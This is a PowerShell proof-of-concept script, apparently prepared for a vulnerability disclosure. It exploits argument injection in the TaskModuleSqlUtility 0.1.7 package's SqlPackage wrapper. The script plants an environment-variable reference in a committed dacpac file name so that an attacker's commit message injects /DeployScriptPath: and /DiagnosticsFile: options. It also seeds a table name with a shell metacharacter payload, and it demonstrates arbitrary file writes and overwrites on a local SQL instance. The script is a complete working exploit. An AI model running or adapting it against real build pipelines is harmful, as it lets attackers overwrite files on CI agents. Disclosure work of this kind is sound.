# The argv injected past the --% stop-parsing token reaches Microsoft's real SqlPackage.exe
# as options it acts on. This drives /DeployScriptPath: to write a file at a path the injected
# option chose, whose content is derived from the dacpac the attacker authored, and shows the
# write replacing an existing file. Both functions are read out of the published
# TaskModuleSqlUtility 0.1.7 nupkg next to this script and run unmodified. The target is a
# local SQL Server instance created for the run. No remote host is contacted.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path ([System.IO.Path]::GetTempPath()) ("dsp-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db') | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $work 'victim') | Out-Null
$victimDir = Join-Path $work 'victim'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)

$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# stand up a local instance and author a dacpac. The object names are attacker chosen, one
# carrying metacharacters, so whether they survive into the written file is measurable.
$inst = 'MSRCPOC'
& SqlLocalDB.exe create $inst 2>&1 | Out-Null
& SqlLocalDB.exe start  $inst 2>&1 | Out-Null
$target = "(localdb)\$inst"
$ddl = @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[ZZMARKER_ATTACKER_AUTHORED_OBJECT] (id INT NOT NULL);
GO
CREATE TABLE dbo.[ZZMETA& echo METACHAR_SURVIVED >con &] (id INT NOT NULL);
GO
"@
Set-Content -Path (Join-Path $work 'seed.sql') -Value $ddl -Encoding ASCII
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 4 | ForEach-Object { Write-Output ("  seed> " + $_) }
$srcDac = Join-Path $work 'db\Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output ("  extract> " + $_) }

function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 4 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

# INJECT: attacker-chosen /DeployScriptPath:, content derived from the authored dacpac
$out1 = Join-Path $victimDir 'deploy.sql'
$junk = Join-Path $work 'junk'
$msg = '.dacpac" /DeployScriptPath:"' + $out1 + '" /DiagnosticsFile:"' + $junk
RunLeg 'INJECT  attacker-chosen /DeployScriptPath:' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msg
Write-Output ("  DEPLOY SCRIPT WRITTEN AT ATTACKER PATH : " + (Test-Path $out1))
if (Test-Path $out1) {
    $body = Get-Content $out1 -Raw
    Write-Output ("    bytes : " + (Get-Item $out1).Length)
    Write-Output ("    CONTAINS attacker-authored object name  : " + ($body -match 'ZZMARKER_ATTACKER_AUTHORED_OBJECT'))
    Write-Output ("    CONTAINS attacker metacharacter string  : " + ($body -match 'METACHAR_SURVIVED'))
    (Select-String -Path $out1 -Pattern 'ZZMETA' | Select-Object -First 1) | ForEach-Object { Write-Output ("    hit>  " + $_.Line.Trim()) }
}

# G1 INJECT: same option aimed at an EXISTING file, to show the write replaces it
Write-Output ""
Write-Output "================ G1 INJECT  /DeployScriptPath: aimed at an EXISTING file"
Set-Content -Path $out1 -Value 'ORIGINAL-CONTENT-LINE-1' -Encoding ASCII
Write-Output ("  G1 pre  : " + (Get-Item $out1).Length + " bytes, content " + (Get-Content $out1 -Raw).Trim())
RunLeg 'G1 INJECT  overwrite an existing file' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msg
if (Test-Path $out1) {
    Write-Output ("  G1 post : " + (Get-Item $out1).Length + " bytes")
    Write-Output ("  G1 ORIGINAL LINE STILL PRESENT : " + ((Get-Content $out1 -Raw) -match 'ORIGINAL-CONTENT-LINE-1'))
}

# CONTROL: identical commit message, percent signs removed from the committed file name
Write-Output ""
Write-Output "================ CONTROL  identical commit message, percent signs removed"
Remove-Item $out1 -Force -ErrorAction SilentlyContinue
RunLeg 'CONTROL percent signs removed' 'FabBUILD_SOURCEVERSIONMESSAGE.dacpac' $msg
Write-Output ("  DEPLOY SCRIPT WRITTEN AT ATTACKER PATH : " + (Test-Path $out1))

Write-Output ""
Write-Output "DONE"
exit 0
